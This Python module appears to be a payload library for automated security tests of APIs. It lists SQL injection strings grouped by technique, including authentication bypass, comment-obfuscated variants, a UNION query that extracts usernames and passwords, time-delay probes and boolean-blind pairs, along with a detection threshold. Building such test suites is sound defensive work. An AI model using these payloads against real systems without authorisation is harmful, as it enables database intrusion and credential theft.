"""
SQL Injection payload library.

This module contains reusable SQL injection payloads grouped by
attack technique.

Keeping payloads separate from test execution makes it easier to:

    - Add new payloads
    - Reuse payloads across multiple APIs
    - Expand security coverage
    - Maintain attack categories independently
"""


# ============================================================================
# CLASSIC SQL INJECTION PAYLOADS
# ============================================================================

CLASSIC_SQLI_PAYLOADS = [

    "' OR '1'='1",

    "' OR '1'='1' -- ",

    "admin' --",

    "' OR 1=1#",

    '" OR "1"="1',

]


# ============================================================================
# COMMENT STYLE SQL INJECTION PAYLOADS
# ============================================================================

COMMENT_STYLE_SQLI_PAYLOADS = [

    "' OR '1'='1' /*",

    "'/**/OR/**/'1'='1",

    "' OR '1'='1'#",

    "') OR ('1'='1",

]


# ============================================================================
# UNION BASED SQL INJECTION PAYLOADS
# ============================================================================

UNION_SQLI_PAYLOADS = [

    "' UNION SELECT NULL--",

    "' UNION SELECT username, password FROM users--",

]


# ============================================================================
# TIME BASED SQL INJECTION PAYLOADS
# ============================================================================

TIME_BASED_SQLI_PAYLOADS = [

    "'; WAITFOR DELAY '0:0:05'--",

    "' OR SLEEP(5)-- ",

]


# ============================================================================
# BOOLEAN BASED BLIND SQL INJECTION PAYLOAD PAIRS
# ============================================================================

BOOLEAN_BLIND_PAIRS = [

    (

        "' AND 1=1-- ",

        "' AND 1=2-- ",

    ),

    (

        "' OR 'a'='a",

        "' OR 'a'='b",

    ),

]


# ============================================================================
# TIME BASED DETECTION CONFIGURATION
# ============================================================================

TIME_BASED_THRESHOLD_SECONDS = 4.5